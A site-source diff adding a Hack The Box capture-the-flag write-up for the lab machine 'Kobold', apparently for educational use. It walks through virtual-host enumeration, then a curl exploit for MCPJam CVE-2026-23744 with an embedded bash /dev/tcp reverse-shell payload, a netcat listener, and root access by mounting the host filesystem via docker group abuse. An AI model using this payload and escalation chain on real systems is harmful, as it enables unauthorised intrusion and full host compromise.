@@ -1,0 +1,175 @@
+export const frontmatter = {
+  title: "Hack The Box Kobold Machine Writeup",
+  slug: "hack-the-box-kobold-machine-writeup",
+  category: "HTB Machine",
+  tags: "MCPJam, Docker",
+  description:
+    "Complete walkthrough of the Hack The Box Kobold machine, covering virtual host enumeration, MCPJam remote code execution, reverse shell access, Docker group abuse, host filesystem mounting, and root access through a Docker privilege escalation.",
+  date: "2026-08-02",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Kobold Writeup | MCPJam RCE, CVE-2026-23744 & Docker Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Kobold machine writeup demonstrating virtual host enumeration, exploitation of MCPJam CVE-2026-23744 for remote code execution, reverse shell access, Docker group privilege escalation, host filesystem access through a mounted container, and full root compromise.",
+};
+
+## Introduction
+
+This machine demonstrates a full attack chain starting from virtual host enumeration, leading to exploitation of a vulnerable MCPJam instance for remote code execution, followed by internal enumeration and privilege escalation via Docker misconfiguration. By abusing Docker group membership, we mount the host filesystem and achieve root access.
+
+## Setup
+
+Download a VPN configuration file from webpage and connect to it via `sudo openvpn file.ovpn`
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name
+
+To check if everything is working fine, we can use `ping <ip_addr>`
+
+## Enumeration
+
+Perform a Nmap scan with version detection (`-sV`) with: `nmap -sV -T4 <ip_addr>`:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-22 12:50 IST
+Nmap scan report for 10.129.4.43
+Host is up (0.44s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE   VERSION
+22/tcp  open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http      nginx 1.24.0 (Ubuntu)
+443/tcp open  ssl/https nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
+```
+We used `-T4` to speed up the scan
+
+> **NOTE:** This speeds up the scan by making it more aggressive but slightly noisier on the network
+
+Visit IP address in browser, which redirects to `kobold.htb` and to make it accessible edit the hosts file under `/etc/hosts` to add a line `<ip_addr> kobold.htb` This is done so the local system can resolve the domain name to the target machine. The target web server may use virtual host configuration, meaning it serves the intended application only when the correct hostname is provided in the HTTP request
+
+For VHOST enumeration with `gobuster` with `gobuster vhost -u https://kobold.htb/ -w ~/Desktop/subdomains-top1million-20000.txt -k --append-domain` we get 
+```
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+bin.kobold.htb Status: 200 [Size: 24402]
+mcp.kobold.htb Status: 200 [Size: 466]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+Here:
+- `vhost` which stands for `Virtual Host` which is a way for a single web server (same IP address) to host multiple domain names/websites
+- `-u` is used to specify the base URL
+- `-w` is used to specify the wordlist
+- `-k` is used to skip TLS/SSL certificate verification, with this `gobuster` proceeds even if the certificate isn't valid, isn't signed by trusted authority or it doesn't match the domain name
+- `--append-domain` this automatically appends the target domain to each word in your wordlist
+
+> **NOTE:** We will need to add `mcp.kobold.htb` and `bin.kobold.htb` to `/etc/hosts` so finally it should look like `<machine_ip_adddr>	kobold.htb mcp.kobold.htb bin.kobold.htb`
+
+`mcp.kobold.htb` runs MCPJam v1.4.2 which is vulnerable to [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)
+
+## Foothold
+
+Therefore the crafted exploit for RCE is 
+```
+curl -v -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/<ip_addr>/<port> 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
+```
+Here:
+- We used `-v` to see verbose output
+- `-k` to skip TLS/SSL certificate check
+- `https://mcp.kobold.htb/api/mcp/connect` is our target URL
+- `--header "Content-Type: application/json"` tells server this cURL request is sending JSON data
+- `--data "{...<SNIP>...}"` the data which is being sent to server
+- `{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/10.10.14.13/9001 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}` on server it is executed using `bash` with argument `-c` to execute `bash -i >& /dev/tcp/<ip_addr>/<port> 0>&1`
+
+> **NOTE:** Replace `<ip_addr>` with your Machine IP address and `<port>` with you desired port
+
+> maybe_you_can_explain_the_exploit
+
+In terminal start the listener with `nc -lvnp <port>`
+
+In different terminal window execute the command, upon successful execution it should return a reverse shell
+
+To stabilize the shell follow these steps:-
+- Spawn a pseudo shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- Press `ctrl+z` to make it background
+- `stty raw -echo;fg` 
+- Then `export TERM=xterm` and `export SHELL=/bin/bash` which sets terminal type and defines the shell 
+
+Now navigate to `/home/ben` with `cd /home/ben` and grab the user flag with `cat user.txt`:
+```
+ben@kobold:/$ cd /home/ben
+ben@kobold:~$ cat user.txt
+a2d...<SNIP>...98f
+```
+
+## Internal Enumeration 
+
+Upon running `systemctl list-units --type=service --state=running` it shows that docker is running as a service
+```
+UNIT                      LOAD   ACTIVE SUB     DESCRIPTION                  
+arcane.service            loaded active running Arcane Service
+...<SNIP>...
+docker.service            loaded active running Docker Application Container 
+...<SNIP>...
+upower.service            loaded active running Daemon for power management
+vgauth.service            loaded active running Authentication service for vi
+```
+
+With `ps aux | grep docker` this reveals that it is running as a root:
+```
+root        1561  0.0  1.8 1972104 72992 ?       Ssl  07:42   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root        1916  0.0  0.1 1671112 4236 ?        Sl   07:42   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080 -use-listen-fd
+```
+
+With `getent group | grep docker` reveals that it includes user `alice`, which indicates that any user able to switch to this group can gain Docker access, which effectively grants root-equivalent privileges due to Docker’s ability to interact with the host system
+
+With `find / -perm -4000 -type f 2>/dev/null` we can view all SUID and it reveals an interesting SUID `/usr/bin/newgrp` which allows switching to docker group without needing full privileges, effectively granting Docker access to current user
+
+We can use the SUID binary `newgrp` as `newgrp docker` and we can check if it was successful with `id`:
+```
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+```
+
+At this point, we have the ability to interact with the Docker daemon, which effectively grants root-level capabilities on the host.
+
+We can view process running in docker with `docker ps`:
+```
+CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS       PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   6 weeks ago   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
+```
+
+With `docker run -tid -v /:/mnt/ --name priv_esc privatebin/nginx-fpm-alpine:2.0.2 /bin/sh` we can create a docker container, below is command breakdown
+- `docker run` starts a docker container from an image 
+- `-t` allocates a TTY, `-i` keeps it in interactive mode and `-d` runs it in background
+- `/:/mnt/` this mounts the entire `/` path to `/mnt/` of container (source_directory_to_mount:directory_to_be_mounted_on)
+- `--name` is used to define name of the container, in this case it is named as `priv_esc`
+- `privatebin/nginx-fpm-alpine:2.0.2` is image used for container
+- `/bin/sh` is default command that will be executed once the container starts
+
+And with `docker exec -it -u root priv_esc sh` get a shell as the `root` user, Here:
+- `docker exec` runs the docker image for interactive use
+- `-i` keeps it in interactive mode and `-t` allocates a TTY
+- `priv_esc` refers to container name
+- `-u root` runs in container as a user `root`
+- `sh` starts the shell inside container
+
+## Post-Exploitation
+
+Since the host file system is mounted under `/mnt`, we gain unrestricted access to the host filesystem, including sensitive directories such as `/root`
+
+Generally root flag is stored under `/mnt/root` we can navigate to it with `cd`
+
+Grab the root flag with `cat root.txt`:
+```
+264...<SNIP>...413
+```
+
+## Conclusion
+
+This machine highlights the risks of exposing vulnerable web services and misconfigured container environments. The attack chain demonstrates how initial access via web exploitation can be escalated through improper privilege separation, particularly Docker group membership, ultimately leading to full system compromise
+
